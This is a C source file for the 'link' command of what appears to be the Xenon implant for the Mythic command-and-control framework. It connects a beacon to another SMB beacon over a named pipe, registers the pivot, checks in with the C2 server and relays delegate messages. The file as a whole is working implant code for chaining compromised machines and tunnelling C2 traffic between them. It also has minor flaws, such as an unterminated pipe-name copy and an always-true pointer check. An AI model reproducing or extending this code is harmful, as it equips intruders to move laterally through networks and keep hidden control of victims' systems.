#include "Tasks/Link.h"

#include "Xenon.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_LINK

/**
 * @brief Link current Beacon to an SMB Beacon.
 * 
 * @ref 
 * @return VOID
 */
VOID Link(PCHAR taskUuid, PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T pipeLen      = 0;
	PCHAR  PipeName     = ParserGetString(arguments, &pipeLen);

    _dbg("Adding Link Agent for Pipename: %s", PipeName);

    /* Output */
    PVOID outBuf  = NULL;
    SIZE_T outLen = 0;


    /* Connect to Pivot Agent */
    DWORD Result = 0;
    if ( !LinkAdd(PipeName, &outBuf, &outLen) ) 
    {
        _err("Failed to link smb agent.");
        Result = GetLastError();
        PackageError(taskUuid, Result);
        goto END;
    }

    /* P2P Linking uses a Custom Package ID - LINK_ADD */
    PPackage locals = PackageInit(LINK_ADD, TRUE);      
    PackageAddString(locals, taskUuid, FALSE);              // PCHAR:               Task ID
    PackageAddInt32(locals, Result);                        // INT32:               Status   
    PackageAddString(locals, outBuf, TRUE);                 // DWORD + PCHAR:       Link ID + B64 Message

    /* Send P2P Checkin Message to Mythic */
    PARSER Response = { 0 };
    PackageSend(locals, &Response);


    /* Handle the delegate message back */
    PCHAR  P2pUuid          = NULL;
    PCHAR  P2pMsg           = NULL;
    SIZE_T P2pIdLen         = 0;
    SIZE_T P2pMsgLen        = 0;
    UINT32 NumOfDelegates   = 0;

    /* Now check delegate boolean */
    BOOL isDelegates = (BOOL)ParserGetByte(&Response);
    _dbg("isDelegates : %s", isDelegates ? "TRUE" : "FALSE");
    if ( isDelegates ) 
    {
        NumOfDelegates = ParserGetInt32(&Response);
        _dbg("Package should contain %d msgs.", NumOfDelegates);

        P2pUuid       = ParserGetString(&Response, &P2pIdLen);
        P2pMsg        = ParserStringCopy(&Response, &P2pMsgLen);

        _dbg("P2P New UUID          : %s", P2pUuid);
        _dbg("P2P Raw Msg %d bytes  : %s", P2pMsgLen, P2pMsg);
    }
    else 
    {
        _err("No delegates because byte was : 0x%hx", isDelegates);
        goto END;
    }

    // Forward to pipe
    LinkForward( P2pMsg, P2pMsgLen );


    // _dbg("LINK_ADD Response");
    //print_bytes(Response.Buffer, Response.Length);

    /* This agent may now receive delegate messages for Link */

END:

    PackageDestroy(locals);
    LocalFree(outBuf);
    if (P2pMsg) LocalFree(P2pMsg);
    if (&Response) ParserDestroy(&Response);

    return;
}

///////////////////////////////////////////////////////////////

/**
 * @brief UnLink current Beacon from an SMB Beacon.
 * 
 * @ref  
 * @return VOID
 */
VOID UnLink(PCHAR taskUuid, PPARSER arguments)
{
    return;
}


/**
 *  Helper Functions
 */



 /**
 * @brief Add a new SMB pivot link to Agent.
 * 
 * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Pivot.c  
 * @return BOOL  
 */
BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
{
    PLINKS LinkData    = NULL;
    HANDLE hPipe       = NULL;

    _dbg( "Connecting to named pipe: %s\n", PipeName );

    hPipe = CreateFileA( PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );

    if ( hPipe == INVALID_HANDLE_VALUE )
    {
        _err("CreateFileA failed to connect to named pipe. ERROR : %d", GetLastError());
        return FALSE;
    }

    if ( GetLastError() == ERROR_PIPE_BUSY )
    {
        if ( !WaitNamedPipeA(PipeName, 5000) )
        {
            return FALSE;
        }
    }

    do
    {
        if ( PeekNamedPipe( hPipe, NULL, 0, NULL, outLen, NULL ) )
        {
            if ( *outLen > 0 )
            {
                *outBuf = LocalAlloc(LPTR, *outLen);
                memset(*outBuf, 0, *outLen);

                if ( ReadFile( hPipe, *outBuf, *outLen, outLen, NULL ) )
                {
                    break;
                }
                else
                {
                    _err( "ReadFile: Failed[%d]\n", GetLastError() );
                    CloseHandle(hPipe);
                    return FALSE;
                }
            }
        }
        else
        {
            _dbg( "PeekNamedPipe: Failed[%d]\n", GetLastError() );
            CloseHandle(hPipe);
            return FALSE;
        }
    } while ( TRUE );

    /* Add this Pivot Link to list */
    {
        _dbg("Read %d bytes of data from Link.\n", *outLen);
        
        LinkData                  = LocalAlloc(LPTR, sizeof(LINKS));
        LinkData->hPipe           = hPipe;
        LinkData->Next            = NULL;
        LinkData->LinkId          = PivotParseLinkId(*outBuf, *outLen);
        _dbg("Parsed SMB Link ID => [%x] \n", LinkData->LinkId);
        LinkData->PipeName        = LocalAlloc(LPTR, strlen(PipeName));        // TODO - Check this feels like an issue
        memcpy( LinkData->PipeName, PipeName, strlen(PipeName) );

        if ( !xenonConfig->SmbLinks )
        {
            xenonConfig->SmbLinks = LinkData;
        }
        else
        {
            PLINKS LinksList = xenonConfig->SmbLinks;

            do
            {
                if ( LinksList )
                {
                    if ( LinksList->Next ) 
                    {
                        LinksList = LinksList->Next;
                    }
                    else
                    {
                        LinksList->Next = LinkData;
                        break;
                    }
                }
                else break;
            } while ( TRUE );
        }
    }

    return TRUE;
}


BOOL LinkForward( PVOID Msg, SIZE_T Length )
{
    /** New Packet Format
     * 
     * ( isDelegates? + NumOfDelegates + ( ID + SizeOfMessage + BASE64_MESSAGE ) )
     */
    // BOOL   Success          = FALSE;
    // UINT32 NumOfDelegates   = ParserGetInt32(delegates);
    
    // /* Process all delegate messages */
    // for ( INT i = 0; i < NumOfDelegates; i++ )
    // {
    //     SIZE_T  szId     = 0;
    //     SIZE_T  szMsg    = 0;
    //     UINT32  LinkId   = ParserGetInt32(delegates);
    //     PLINKS  TempLink = xenonConfig->SmbLinks;
        
    //     _dbg("Received Delegate Message for Link ID [%x]", LinkId);
    //     // TODO - create a loop for checking all Links in list
        
    //     if ( LinkId == TempLink->LinkId )
    //     {
    //         SIZE_T sizeOfMsg = ParserGetInt32(delegates);

    //         _dbg("Received Delegate Message for Link ID [%x]", LinkId);
    //         _dbg("Delegate message Link ID [%x] with %d bytes", LinkId, sizeOfMsg);

    //         if ( !PackageSendPipe(TempLink->hPipe, delegates->Buffer, sizeOfMsg) ) {
    //             DWORD error = GetLastError();
	// 	        _err("Failed to write data to pipe. ERROR : %d", error);
    //             goto END;
    //         }
    //     }
    // }
    BOOL    Success          = FALSE;
    PLINKS  TempLink        = xenonConfig->SmbLinks;

    if ( !PackageSendPipe(TempLink->hPipe, Msg, Length) ) {
        DWORD error = GetLastError();
        _err("Failed to write data to pipe. ERROR : %d", error);
        goto END;
    }

    Success = TRUE;

END:

    return Success;
}


UINT32 PivotParseLinkId( PVOID Buffer, SIZE_T Length )
{
    PARSER  Parser    = { 0 };
    UINT32  Value     = 0;

    ParserNew( &Parser, Buffer, Length );

    // Value  = ParserStringCopy(&Parser, &uuidLen);
    Value = ParserGetInt32(&Parser);

    _dbg("Parsed SMB Link ID => %x \n", Value);

    ParserDestroy(&Parser);

    return Value;

    /* Test */
    // PARSER  Parser    = { 0 };
    // UINT32  Value     = 0;

    // ParserNew( &Parser, Buffer, Length );

    // return ParserGetInt32(&Parser);

}



#endif  //INCLUDE_CMD_LINK